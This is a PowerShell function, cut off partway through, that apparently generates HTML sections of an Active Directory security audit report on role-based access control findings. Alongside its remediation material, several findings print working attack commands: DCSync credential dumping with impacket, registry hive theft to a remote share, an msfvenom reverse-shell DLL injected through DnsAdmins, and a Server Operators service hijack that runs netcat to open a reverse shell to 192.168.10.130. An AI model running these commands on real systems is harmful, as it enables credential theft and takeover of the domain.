function Generate-RBAChtml {  
    param (
        [Parameter()]
        [array]$RBAC,

        [Parameter()]
        [string]$APIkey
    )
    #gen AI prompt for remediation
    $AiSystemMessage = "You are an Active Directory security expert. I will provide you with some information relating to a vulnerability and I want you to respond with exact remediation steps to fix the specified vulnerability in html code. I don't want generic remediation, I want specific steps someone can take and follow step, by step. I want it in numbered steps that go inbetween list tags <ol><li> in html. I want no other information returned."

    if (!$RBAC) {
        $html = @"
        <div class="finding-header">RBAC</div>
        <h2 class="novuln">No vulnerabilities found!</h2>
"@
    }
    else {
        $html = @"
        <div class="finding-header">RBAC</div>
        <div class="domain-info">
            <p>This section contains technical vulnerability details relating to the Role-Based Access Control implementation.</p>
        </div>
        <div class="finding-container">
        <table>
            <thead>
                <tr>
                    <th class="table-header-left">Issue</th>
                    <th class="table-header-right">Risk</th>
                </tr>
            </thead>
            <tbody>
"@
        foreach ($finding in $RBAC) {
             #replace console colours 
             if($finding.Risk -match "critical"){
                $finding.Risk = "Critical"
            } elseif ($finding.Risk -match "high"){
                $finding.Risk = "High"
            } elseif ($finding.Risk -match "medium"){
                $finding.Risk = "Medium"
            } elseif ($finding.Risk -match "low"){
                $finding.Risk = "Low"
            } elseif ($finding.Risk -match "informational"){
                $finding.Risk = "Informational"
            }
            $remediation = Connect-ChatGPT -APIkey $APIkey -Prompt $finding -Temperature 0.7 -AiSystemMessage $AiSystemMessage
            if ($finding.Technique -eq "Suspicious / legacy admin account") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
    <tr>
        <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
        <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
    </tr>
    <tr class="finding">
        <td colspan="3">
            <div class="finding-info">
                <table>
                    <tbody>
                        <tr>
                            <th>Issue</th>
                            <th>MITRE ATT&CK ref</th>
                            <th>Score</th>
                        </tr>
                        <tr>
                            <td>User has the adminCount attribute set to 1 but is not a member of privileged groups.</td>
                            <td>TA0003</td>
                            <td>+$($finding.Score)</td>
                        </tr>
                    </tbody>
                </table>
                <table>
                    <tbody>
                        <tr>
                            <th>Relevant info</th>
                            <th>Issue explanation</th>
                        </tr>
                        <tr>
                            <td class="relevantinfo"><table>
                                <tr><td class="grey">Users</td><td>$($finding.Name -replace "`r?`n", "<br>")</td></tr>
                                <tr><td class="grey">adminCount</td><td>$($finding.adminCount)</td></tr>
                            </table></td>
                            <td class="explanation">
                                <p>Any user account that is added to default privileged groups in active directory (account operators, domain admins, etc) is assigned an adminCount property of 1. This is done to ensure members of protected groups have standardized and controlled security descriptors, as every 60 minutes Active Directory will take the ACL's of the AdminSDHolder and apply it to the protected users and groups with AdminCount set to 1, to ensure they have no rogue ACLs set and remain protected. If accounts have the adminCount set to 1 but are not a member of default privileged groups this is suspicious and may indicate an attacker has applied their own ACL's to AdminSDHolder and have waited for them to propogate in order to achieve persistence over these accounts.</p>
                                <p>$($finding.Issue).</p> 
                                <p class="links"><b>Further information:</b></p>
                                <p><a href="https://blog.netwrix.com/2022/09/30/admincount_attribute/">Link 1</a></p>
                                <p><a href="https://specopssoft.com/support/en/password-reset/understanding-privileged-accounts-and-adminsdholder.htm">Link 2</a></p>
                            </td>
                        </tr>
                    </tbody>
                </table>
                <table>
                    <tbody>
                        <tr>
                            <th>Attack explanation</th>
                        </tr>
                        <tr>
                            <td>
                                <div class="attack-container">
                                    <div class="attack-text">
                                        <p>1. Any low-privileged user can enumerate users with the adminCount property set to 1, which gives a list of privileged accounts with ACLs controlled via the AdminSDHolder. Any account not a member of default privileged groups should be investigated.</p>
                                        <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --admin-count</p>
                                    </div>
                                    <span class="image-cell">
                                        <img src="/Private/Report/Images/RBAC/adminsdholder-1.png" alt="Finding users with adminCount set to 1">
                                    </span>
                                </div>
                            </td>
                        </tr>
                    </tbody>
                </table>
                <table>
                    <tbody>
                        <tr>
                            <th>Remediation</th>
                        </tr>
                        <tr>
                            <td>
                                <p>$remediation</p>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </td>
    </tr>
"@  
            }
            elseif ($finding.Technique -match "anonymous access is permitted") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>The guest account is enabled allowing unauthenticated access to domain resources.</td>
                                        <td>TA0001</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Account</td><td>$($finding.account)</td></tr>
                                            <tr><td class="grey">Enabled</td><td>True</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Guest account is a default local account that has limited access to the computer and is disabled by default but will facilitate anonymous acces to domain resources if enabled. By default, the Guest account password is left blank which allows the Guest account to be accessed without requiring the user to enter a password. Attackers can then access file shares and remotely enumerate the domain from an unauthenticated standpoint.</p>
                                            <p>$($finding.Issue).</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.trustedsec.com/blog/new-tool-release-rpc_enum-rid-cycling-attack">Link 1</a></p>
                                            <p><a href="https://www.whiteoaksecurity.com/blog/active-directory-security/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. An unauthenticated attacker can enumerate file shares on systems if the guest account is active, allowing them to crawl through company documeents for sensitive information.</p>
                                                    <p class="code">nxc smb dc.test.local -u anonymous -p '' --shares</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/anonymous-1.png" alt="Finding open shares">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. RID Cycling is a method that allows attackers to enumerate domain objects by bruteforcing or guessing RIDs and SIDs, based on the fact that RIDs are sequential. If the guest account is enabled facilitating read access to the IPC$ share on a domain controller, an unauthenticated attacker can enumerate all users and groups within the domain.</p>
                                                    <p class="code">nxc smb dc.test.local -u anonymous -p '' --rid-brute</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/anonymous-2.png" alt="RID brute">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "Inactive/stale") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Accounts that have not logged on in the last 90 days are not disabled.</td>
                                        <td>TA0003</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
"@
                                if($finding.Technique -match "privileged") {
                                    $html+= @"
                                    <tr><td class="grey">Total privileged & inactive</td><td>$($finding.totalinactive)</td></tr>
                                    <tr><td class="grey">Users</td><td>$($finding.Users -replace "`r?`n", "<br>")</td></tr>
                                    <tr><td class="grey">Member of</td><td>$($finding.MemberOf -replace "`r?`n", "<br>")</td></tr>
                                    <tr><td class="grey">Enabled</td><td>$($finding.Enabled)</td></tr>
                                    <tr><td class="grey">Inactivity period</td><td>$($finding.Inactivityperiod)</td></tr>
"@
                                } else{
                                    $html+= @"
                                    <tr><td class="grey">Total inactive users</td><td>$($finding.totalinactive)</td></tr>
                                    <tr><td class="grey">Users</td><td>$($finding.StaleUsers -join "<br>")</td></tr>
                                    <tr><td class="grey">Enabled</td><td>$($finding.Enabled)</td></tr>
                                    <tr><td class="grey">Inactivity period</td><td>$($finding.Inactivityperiod)</td></tr>
"@
                                }
                                $html += @"
                                        </table></td>
                                        <td class="explanation">
                                            <p>Stale user accounts are a significant security issue, as former employees and external attackers could use those accounts to attack the organization. Good cyber security practice guides us to follow the principal of least privilege: if an account is not used, the account should be disabled or removed from privileged groups if it not required.</p>
                                            <p>$($finding.Issue).</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/services-hub/unified/health/remediation-steps-ad/regularly-check-for-and-remove-inactive-user-accounts-in-active-directory">Link 1</a></p>
                                            <p><a href="https://www.lepide.com/blog/how-ad-inactive-accounts-harm-security/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Each user in Active Directory has a lastlogon attribute which can be used to identify stale and unused accounts.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/inactive.png" alt="Inactive accounts">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "Administrators group") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Too many users have full administrative control of the domain.</td>
                                        <td>T1078.002</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>$($finding.MemberCount)</td></tr>
                                            <tr><td class="grey">Members</td><td>$($finding.Members -replace ",", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Administrators are given administrative privileges on the domain controllers, and by default contain the default ‘Administrator’ account, enterprise admins and domain administrators. Reducing the number of domain and enterprise admins will thereby reduce the number of Administrators.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#administrators">Link 1</a></p>
                                            <p><a href="">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Any account in this group has full permission over all domain controllers within the domain, therefore a DCSync can be performed to extract all user credentials from the NTDS.dit stored within the domain controllers to fully compromise all users in the domain.</p>
                                                    <p class="code">impacket-secretsdump test.local/administrator:'Password123!'@dc.test.local -just-dc-ntlm</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/domain-enterprise-administrator.png" alt="Privileged accounts">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "Domain Admins group") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Too many users have full administrative control of the domain.</td>
                                        <td>T1078.002</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>$($finding.MemberCount)</td></tr>
                                            <tr><td class="grey">Members</td><td>$($finding.Members -replace ",", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Domain Admins provide full administrative privilege within the domain, offering the highest level of privilege. Therefore, this should be given to only a select few named administrators and reviewed frequently.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#domain-admins">Link 1</a></p>
                                            <p><a href="">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Any account in this group has full permission over all domain controllers within the domain, therefore a DCSync can be performed to extract all user credentials from the NTDS.dit stored within the domain controllers to fully compromise all users in the domain.</p>
                                                    <p class="code">impacket-secretsdump test.local/administrator:'Password123!'@dc.test.local -just-dc-ntlm</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/domain-enterprise-administrator.png" alt="Privileged accounts">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "Enterprise Admins group") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Too many users have full administrative control of the domain.</td>
                                        <td>T1078.002</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>$($finding.MemberCount)</td></tr>
                                            <tr><td class="grey">Members</td><td>$($finding.Members -replace ",", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Enterprise Admins group gives full administrative privileges to all domains within a forest, offering a higher level of prvilege to domain admins. If the Active Directory consists of only one domain, this group is uneeded. Each domain should have seperate domain admin accounts and the enterprise admin group should not be used, to reduce the risk of lateral movement opportunities across domains.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#enterprise-admins">Link 1</a></p>
                                            <p><a href="">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Any account in this group has full permission over all domain controllers within the domain, therefore a DCSync can be performed to extract all user credentials from the NTDS.dit stored within the domain controllers to fully compromise all users in the domain.</p>
                                                    <p class="code">impacket-secretsdump test.local/administrator:'Password123!'@dc.test.local -just-dc-ntlm</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/domain-enterprise-administrator.png" alt="Privileged accounts">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "DnsAdmins group") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the DnsAdmins can exploit the DNS service on domain controllers to escalate to domain admin privileges.</td>
                                        <td>T1078.002</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>$($finding.MemberCount)</td></tr>
                                            <tr><td class="grey">Members</td><td>$($finding.Members -replace ",", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The DNS Admins group should be empty. Members of DNS Admins are permitted insert a DLL into the DNS service. When the DNS service is hosted on the Domain Controllers it runs as SYSTEM context therefore any maliciously inserted DLL could be used to take control of the domain. It should be noted that this technique was assigned CVE-2021-40469 and will not work if the October 2021 patches are applied to all domain controllers.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">Link 1</a></p>
                                            <p><a href="https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account, an attacker can check if the user is a member of the DnsAdmins group to see if they have the necessary privilege to perform this attack.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/dnsadmin-1.png" alt="Checking for members of dnsadmins">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. If a member, an attacker can first generate a malicious reverse shell payload that will be used to provide a remote command prompt when compromising the DNS service on a domain controller.</p>
                                                    <p class="code">msfvenom -a x64 -p windows/x64/shell_reverse_rcp LHOST=10.10.10.6 LPORT=80 -f dll > exploit.dll</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/dnsadmin-2.png" alt="Generating a payload">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. An attacker can then insert the malcious DLL into the DNS service on a domain controller.</p>
                                                    <p class="code">dmscmd.exe dc01 /config /serverlevelplugindll c:\users\moe\documents\exploit.dll</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/dnsadmin-3.png" alt="Inserting the dll">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>4. Upon restarting the DNS service (dns admins have privilege to do this) the malicious DLL will be executed and return a privileged reverse shell to an attacker.</p>
                                                    <p class="code">sc.exe \\dc01 stop dns</p>
                                                    <p class="code">sc.exe \\dc01 start dns</p>
                                                    <p class="code">nc -lvnp 80</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/dnsadmin-4.png" alt="Receiving a system shell on the domain controller">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "Backup Operators group") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the Backup Operators group can extract all credential information from domain controllers.</td>
                                        <td>T1078.002</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>$($finding.MemberCount)</td></tr>
                                            <tr><td class="grey">Members</td><td>$($finding.Members -replace ",", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Backup Operators group can backup and restore files and directories that are located on each domain controller in the domain. Users can therefore login and modify all files on a domain controller including credential information from the SAM and SYSTEM hives stored on domain controllers, giving effective domain admin privileges. Best practice is to keep the group empty in favour of a custom role-based group giving only the privileges required.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.bordergate.co.uk/backup-operator-privilege-escalation/">Link 1</a></p>
                                            <p><a href="https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Backup Operators group to see if they have the necessary privilege to perform this attack.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/backupoperator-1.png" alt="Checking for members of backup operators">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. If a member, an attacker can perform a backup of the SAM, SYSTEM and SECURITY hives which store the local credential information on the domain controller.</p>
                                                    <p class="code">impacket-reg test.local/backupoperator:'Password123!'@dc.test.local backup -o '\\192.168.10.130\share'</p>
                                                    <p class="code">impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/backupoperator-2.png" alt="Extracting SAM and SYSTEM hive from domain controller">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. With the domain controller machine account hash obtained, this is sufficient to replicate the behavior of a domain controller and obtain all the user password hashes within the domain via a DCSync.</p>
                                                    <p class="code">impacket-secretsdump test.local/'DC$'@dc.test.local -hashes :89aca08404383706e09c9861dfee797e</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/backupoperator-3.png" alt="Performing a DCSync">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "Server Operators group") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the Server Operators group can indirectly compromise the domain by administering domain controllers.</td>
                                        <td>T1078.002</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>$($finding.MemberCount)</td></tr>
                                            <tr><td class="grey">Members</td><td>$($finding.Members -replace ",", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Server Operators group should be empty as they can administer domain controllers. Server Operators can take indirect control of the domain because they have write access to critical domain resources having permission to stop, replace and start system services on domain controllers. An attacker could login to a domain controller, replace a service with a malicious binary and restart the service to executive the binary in SYSTEM context, fully compromising the domain. Best practice is to keep the group empty in favour of a custom role-based group giving only the privileges required.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">Link 1</a></p>
                                            <p><a href="https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Server Operators group to see if they have the necessary privilege to perform this attack.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/serveroperator-1.png" alt="Checking for members of server operators">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. If a member, an attacker can change the configuration of a service running as SYSTEM with a malicious file and restart the service to execute the malicious file within SYSTEM context.</p>
                                                    <p class="code">services</p>
                                                    <p class="code">sc.exe config VMTools binPath="C:\windows\tasks\nc64.exe -e cmd.exe 192.168.10.130 443"</p>
                                                    <p class="code">sc.exe stop VMTools</p>
                                                    <p class="code">sc.exe start VMTools</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/serveroperator-2.png" alt="Replacing a service and restarting it">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. This will return a privileged reverse shell on the domain controllerto an attacker.</p>
                                                    <p class="code">nc -lvnp 443</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/serveroperator-3.png" alt="Receiving a reverse shell on a domain controller">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "Account Operators group") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the Account Operators group are overly permissive and can log into domain controllers.</td>
                                        <td>T1078.002</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>$($finding.MemberCount)</td></tr>
                                            <tr><td class="grey">Members</td><td>$($finding.Members -replace ",", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
